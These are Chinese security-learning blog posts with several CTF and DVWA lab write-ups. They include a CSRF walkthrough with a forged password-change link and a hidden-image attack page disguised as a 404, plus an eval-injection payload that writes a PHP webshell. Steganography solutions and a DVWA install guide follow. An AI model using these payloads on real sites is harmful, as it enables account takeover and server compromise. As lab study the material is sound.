<p>跟<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC/23316003">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>对用户<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8/8309940">网页浏览器</a>的信任。</p>
<p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
<p>啊，这样与以前在电脑和手机上看见那些不怀好意的链接（别问我怎么看出来的），就是诱导单纯的人去点，原来有这么高大上的名字，有点小尴尬，之前我都按木马来理解……</p>
<p>对于dvwa的csrf这关，我查阅了几篇博客。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="**Low*\***"></a><strong><em>*</em>*Low*\</strong>***</h2><p>服务器端核心代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123; <br><br>    <span class="hljs-comment">// Get input </span><br><br>    $pass_new  = $_GET[ <span class="hljs-string">&#x27;password_new&#x27;</span> ]; <br><br>    $pass_conf = $_GET[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ]; <br><br> <br>    <span class="hljs-comment">// Do the passwords match? </span><br><br>    <span class="hljs-keyword">if</span>( $pass_new == $pass_conf ) &#123; <br><br><br><br>        <span class="hljs-comment">// They do! </span><br><br>        $pass_new = mysql_real_escape_string( $pass_new ); <br>        $pass_new = md5( $pass_new ); <br><br><br>        <span class="hljs-comment">// Update the database </span><br><br><br><br>        $insert = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>; <br><br><br><br>        $result = mysql_query( $insert ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> ); <br><br><br>         <span class="hljs-comment">// Feedback for the user </span><br><br><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>; <br><br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123; <br><br>        <span class="hljs-comment">// Issue with passwords matching </span><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>; <br><br>    &#125; <br><br><br>    mysql_close(); <br><br>&#125; <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="**漏洞利用*\***"></a><strong><em>*</em>*漏洞利用*\</strong>***</h2><p>1、构造链接</p>
<p>A) 最基础的:</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p>
<p>当受害者点击了这个链接，他的密码就会被改成123（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p>
<p><a href="http://image.3001.net/images/20161031/14778953244372.png"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p>
<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
<p><a href="http://image.3001.net/images/20161031/14778953704168.png"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p>
<p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p>
<p>B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p>
<p>如<a href="http://dwz.cn/">http://dwz.cn/</a>****</p>
<p><a href="http://image.3001.net/images/20161031/14778954786668.png"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p>
<p>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p>
<p><a href="http://image.3001.net/images/20161031/14778955097586.png"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p>
<p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
<p>C) 构造攻击页面</p>
<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
<p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>nep_MISC</title>
    <url>/2021/03/15/2021/nepnep/nep%E9%A2%98/</url>
    <content><![CDATA[<p> 解题过程思路来自于<a href="https://blog.csdn.net/Nebula1805/article/details/113833930">https://blog.csdn.net/Nebula1805/article/details/113833930</a></p>
<h5 id="属性-jpg"><a href="#属性-jpg" class="headerlink" title="属性.jpg"></a>属性.jpg</h5><p>签到题，依题意将图片保存后查看属性，得到flag.</p>
<p><img src="/2021/03/15/2021/nepnep/nep%E9%A2%98/%E5%B1%9E%E6%80%A7.jpg"></p>
<h5 id="sring-jpg"><a href="#sring-jpg" class="headerlink" title="sring.jpg"></a>sring.jpg</h5><p>本来想按照上题解，结果发现属性里空空如也</p>
<p>原来这是要用到kali里的string指令</p>
<p>命令格式：<code>strings file</code><br>输入命令<code>strings strings.jpg</code></p>
<p><img src="https://img-blog.csdnimg.cn/20210217143330255.png" alt="在这里插入图片描述"></p>
<h5 id="grep-jpg"><a href="#grep-jpg" class="headerlink" title="grep.jpg"></a>grep.jpg</h5><p>一打开附件，竟然是好康的图（滑稽）</p>
<p>解题重要</p>
<p>用法: <code>grep [选项]... 模式 [文件]...</code><br>输入命令 <code>grep -a &#39;BJD&#39; grep.jpeg</code></p>
<p>同样在kali里实现</p>
<h5 id="aaa-gif"><a href="#aaa-gif" class="headerlink" title="aaa.gif"></a>aaa.gif</h5><p>o,是这么经典的鼓掌</p>
<p>看到闪过的flag图片</p>
<p>Stegsolve工具查看，点击Analyse-&gt;Frame Browser(帧浏览器),查看每一帧</p>
<p>就得到三张关于flag图片</p>
<h5 id="lsb-png"><a href="#lsb-png" class="headerlink" title="lsb.png"></a>lsb.png</h5><p>同样用Stegsolve工具查看，切换通道<br><a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法</a></p>
<p><img src="https://img-blog.csdnimg.cn/20210217151442405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210217151458817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210217151516928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到red，green，blue 0位可能隐藏着信息<br>Analyse-&gt;Data Extract,勾选red，green，blue 0位<br><img src="https://img-blog.csdnimg.cn/20210217153101363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Preview<br><img src="https://img-blog.csdnimg.cn/20210217153156855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到是png格式，save bin以 png为后缀名<img src="https://img-blog.csdnimg.cn/20210217153310561.png" alt="在这里插入图片描述"><br>得到一张二维码<br><img src="https://img-blog.csdnimg.cn/20210217153439273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，得到flag<img src="https://img-blog.csdnimg.cn/20210217154107314.png" alt="在这里插入图片描述"></p>
<h5 id="上课认真听了吗"><a href="#上课认真听了吗" class="headerlink" title="上课认真听了吗"></a>上课认真听了吗</h5><p>根据提示，flag在udp,http,tcp三种流量中，用wireshark打开文件，分别用过滤器锁定三种流量，并以<code>flag&#123;</code> 格式查找<br><img src="https://img-blog.csdnimg.cn/20210218162223708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210218161704740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210218161834397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以flag为flag{25434026}</p>
<h5 id="图片Base64编码"><a href="#图片Base64编码" class="headerlink" title="图片Base64编码"></a>图片Base64编码</h5><p>直接在线Base64转码图片，扫描二维码得到flag</p>
<h5 id="Base编码"><a href="#Base编码" class="headerlink" title="Base编码"></a>Base编码</h5><p>采用了先base32再到base64的过程</p>
<h5 id="16进制查看"><a href="#16进制查看" class="headerlink" title="16进制查看"></a>16进制查看</h5><p>使用了ctf工具包里的工具直接进行查看，flag位于最后几行</p>
<h5 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h5><p>这题很奇怪，我直接绕过了密码，打开flag.txt文件</p>
<p>后来重新几次下载再用工具都提示未有加密文件</p>
]]></content>
      <tags>
        <tag>nep</tag>
      </tags>
  </entry>
  <entry>
    <title>nep的签到题</title>
    <url>/2021/03/24/2021/nepnep/nepctf/</url>
    <content><![CDATA[<p> 这次开开心心参加比赛，难过关掉比赛页面(太cai了)</p>
<p>讲讲三个方面签到题</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>靶机链接：<a href="http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/">http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  error_reporting(<span class="hljs-number">0</span>);<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>  $nep = $_GET[<span class="hljs-string">&#x27;nep&#x27;</span>];<br>  $len = $_GET[<span class="hljs-string">&#x27;len&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(intval($len)&lt;<span class="hljs-number">8</span> &amp;&amp; strlen($nep)&lt;<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(substr($nep,<span class="hljs-number">0</span>,$len));<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too long!&#x27;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这题是传参，也就是要用语句写出payload</p>
<p>payload:    ?len=-1&amp;nep=<code>$_GET[1]</code>;1&amp;1=echo &lt;?php eval($_POST[1]);&gt;2.php</p>
<p>我自己的理解就是，传上len和nep两个量，其中len=-1绕过函数，直接到下一个量</p>
<p>而nep量传参，赋值语句为一句话木马，并且要加上反斜杠，使得语句不会被过滤。</p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(114).png"></p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/Users/David/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(118).png"></p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(115).png"></p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(116).png"></p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(117).png"></p>
<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>啊，其实很简单啊</p>
<p>好气，真的就是只要看出图形就好，我编码解码半天心累</p>
<p>这里用了一个神奇网站：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="/2021/03/24/2021/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(113).png"></p>
<h4 id="cyber"><a href="#cyber" class="headerlink" title="cyber"></a>cyber</h4><p>这里碰到了知识盲区：</p>
<p>猪圈密码，音符密码</p>
<p>看到宝藏文章：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>
]]></content>
      <tags>
        <tag>nep</tag>
      </tags>
  </entry>
  <entry>
    <title>新手区</title>
    <url>/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
<p><img src="/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
<p>那么我们再从文本出发</p>
<p>ctrl+a后到文本中，有线索了！</p>
<p><img src="/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
<p><img src="/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
<p><img src="/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
<p>得到了摩斯电码后，直接上在线编码即可</p>
<p><img src="/2021/04/08/2021/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
<p>如图，flag</p>
<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装dvwa</title>
    <url>/2020/10/02/2021/dvwa/kai%E5%AE%89%E8%A3%85dvwa/</url>
    <content><![CDATA[<h5 id="kali安装dvwa"><a href="#kali安装dvwa" class="headerlink" title="kali安装dvwa"></a>kali安装dvwa</h5><p> 之前啊就有这个想法，不过当时比较懒也没把安全放心上</p>
<p>(好吧，主要还是懒)，打开了kail来安装dvwa靶场，貌似在虚拟机上操作比较安全。</p>
<p> 步骤:</p>
<p> \1. 首先去github上下载DVWA的安装包，网址为：<a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br> \2. 将下载好的压缩包解压并改名为dvwa，然后将其复制到 /var/www/html  文件夹中<br> \3. 打开终端，执行以下命令:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">将apache2停止：service apache2 stop<br>给dvwa文件夹相应的权限：chmod -R <span class="hljs-number">755</span> <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>dvwa<br>启动mysql服务： service mysql start<br>打开mysql： mysql -u root -p<br>创建数据库：create database dvwa;<br>退出mysql：<span class="hljs-keyword">exit</span><br>启动apache2服务：service apache2 start<br></code></pre></td></tr></table></figure>

<p>打开浏览器，在地址栏中输入 127.0.0.1/dvwa  (或者 localhost/dvwa) ,</p>
<p>浏览器会自动跳转到127.0.0.1/dvwa/setup.php 页面，点击页面下方Create/Reset Database按钮，</p>
<p>竟然不能创建数据库，提示 Could not connect to the MySQL service. Please check the config file. 原来是相应配置文件还没有修改。按照以前的文章修改后发现仍然不能连接数据库，刚开始还以为搭建过程中某一步骤出问题了，重新试了一次还是不行，在网上搜索了一番终于找到了答案，原来Kali中的mysql数据库因为某些原因换为了MariaDB,而要连接MariaDB需要创建一个非root用户然后才能以root用户的身份去连接（仅针对此教程，其他的未测试）。   </p>
<p>  在这里遇到了好多问题，第一个就是先非root用户</p>
<p>  成功新增用户david后，我发现不能直接使用指令 ：<strong>sudo -i</strong></p>
<p>（处于非root用户时，输入：<strong>sudo -i</strong> 然后再输入当前用户的密码即可临时开启 <strong>root</strong> 权限）</p>
<p>david 不在 sudoers 文件中。此事将被报告 //呃，有点儿尴尬</p>
<p>查阅下才知道原来得在root下添加username：david</p>
<p>修改 /etc/sudoers 文件，找到下面一行，在root下面添加一行，如下所示：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">## Allow root <span class="hljs-keyword">to</span> run <span class="hljs-keyword">any</span> commands anywhere<br><br>root  <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>)   <span class="hljs-keyword">ALL</span><br><br>david  <span class="hljs-keyword">ALL</span>=(<span class="hljs-keyword">ALL</span>)   <span class="hljs-keyword">ALL</span>  这边root名字下一行改成自己新增用户名字即可；<br></code></pre></td></tr></table></figure>

<p>​    \4. 终端执行 mysql -u root -p  ,回车，然后输入自己设置的MariDB用户的密码（如果没设置过的话就为空）</p>
<p> 执行以下SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;dvwauser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;dvwauser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br><br><span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;<br><br>quit<br></code></pre></td></tr></table></figure>



<p>​    \5. 修改dvwa的配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>dvwa<span class="hljs-regexp">/config/</span><br><br>ls  <br><br>cp config.inc.php.dist config.inc.php<span class="hljs-comment">#这是复制命令操作</span><br></code></pre></td></tr></table></figure>



<p>​       将$_DVWA[ ‘db_user’ ]   = ‘root’;  修改为：             $_DVWA[ ‘db_user’ ]   = ‘dvwauser’; </p>
<p>​    </p>
<p>​        $_DVWA[ ‘db_password’ ] = ‘p@ssword’;  修改为：      $_DVWA[ ‘db_password’ ] = ‘’;   </p>
<p>这边我不太懂作者为什么一定要这样修改，因为其他很多文章改法不一，但是这样改不会报错就无妨。  </p>
<p>根据实际情况重启下apache2：  有点像PHP study那样启动相应程序</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">service</span> apache<span class="hljs-number">2</span> restart<br></code></pre></td></tr></table></figure>



<p>   打开浏览器，在地址栏中输入 127.0.0.1/dvwa  (或者 localhost/dvwa) ,浏览器会自动跳转到127.0.0.1/dvwa/setup.php 页面，点击页面下方Create/Reset Database按钮，可以发现dvwa连接数据库成功并创建了相应的表。接下来就可以使用  </p>
<p>用户名： admin   密码： password  登录进行测试了！</p>
<p><img src="/2020/10/02/2021/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(51).png"></p>
<p><img src="/2020/10/02/2021/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(52).png"></p>
<p>这里同时收录下另一个问题：</p>
<h6 id="dvwa出现报错"><a href="#dvwa出现报错" class="headerlink" title="dvwa出现报错"></a>dvwa出现报错</h6><p>提示DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</p>
<p>解决方法：提示已经告诉了，找不到配置文件，复制config目录下的config.inc.php.dist文件到config.inc.php，然后配置环境。于是按照他说的来，进入phpstudy安装目录下的WWW\DVWA\config中，把config.inc.php.dist复制一下，并且还在这个文件夹中粘贴，然后去掉后缀  .dist 。刷新即OK。</p>
<p>转载大部分内容于：<a href="https://blog.csdn.net/wanzt123/article/details/77476007">https://blog.csdn.net/wanzt123/article/details/77476007</a></p>
<p>参考链接：<a href="https://www.cnblogs.com/MirageFox/p/12852507.html">https://www.cnblogs.com/MirageFox/p/12852507.html</a></p>
<p><a href="https://www.cnblogs.com/myworld2018/p/8383611.html">https://www.cnblogs.com/myworld2018/p/8383611.html</a></p>
<p><a href="https://blog.csdn.net/weixin_39762423/article/details/83035209">https://blog.csdn.net/weixin_39762423/article/details/83035209</a></p>
<p><a href="https://blog.csdn.net/wenxuechaozhe/article/details/69092769">https://blog.csdn.net/wenxuechaozhe/article/details/69092769</a></p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>0</title>
    <url>/2021/10/14/2021/misc/0/</url>
    <content><![CDATA[<h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件用010editor打开图片</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014102322578.png" alt="image-20211014102322578"></p>
<p>左下角出现CRC错误提示，怀疑图片宽高被修改了</p>
<p>我们只需要把图片的宽高修改到一样即可</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014102527640.png" alt="image-20211014102527640"></p>
<p>保存后重新打开</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014102607570.png" alt="image-20211014102607570"></p>
<h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>简单的zip密码爆破</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014102826717.png" alt="image-20211014102826717"></p>
<p>得到密文：ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</p>
<p>base64解密一下就好</p>
<h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>打开后将图像另存为，然后010打开</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014103429846.png" alt="image-20211014103429846"></p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014103446744.png" alt="image-20211014103446744"></p>
<h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p><img src="/2021/10/14/2021/misc/0/image-20211014110141284.png" alt="image-20211014110141284"></p>
<p>steg走一波</p>
<p>是LSB隐写</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014110238268.png" alt="image-20211014110238268"></p>
<h3 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h3><p>这题重要的还是脚本</p>
<p>打开zip</p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014110553017.png" alt="image-20211014110553017"></p>
<p><img src="/2021/10/14/2021/misc/0/image-20211014110605846.png" alt="image-20211014110605846"></p>
<p>抄了大佬脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_base64_diff_value</span>(<span class="hljs-params">s1, s2</span>):</span><br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(len(s2)):<br>        <span class="hljs-keyword">if</span> s1[i] != s2[i]:<br>            <span class="hljs-keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_stego</span>():</span><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;ComeOn!.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_lines = f.readlines()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_lines:<br>            steg_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = get_base64_diff_value(steg_line, norm_line)<br>            <span class="hljs-keyword">print</span> diff<br>            pads_num = steg_line.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-keyword">if</span> diff:<br>                bin_str += bin(diff)[<span class="hljs-number">2</span>:].zfill(pads_num * <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">else</span>:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            <span class="hljs-keyword">print</span> goflag(bin_str)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">goflag</span>(<span class="hljs-params">bin_str</span>):</span><br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(bin_str), <span 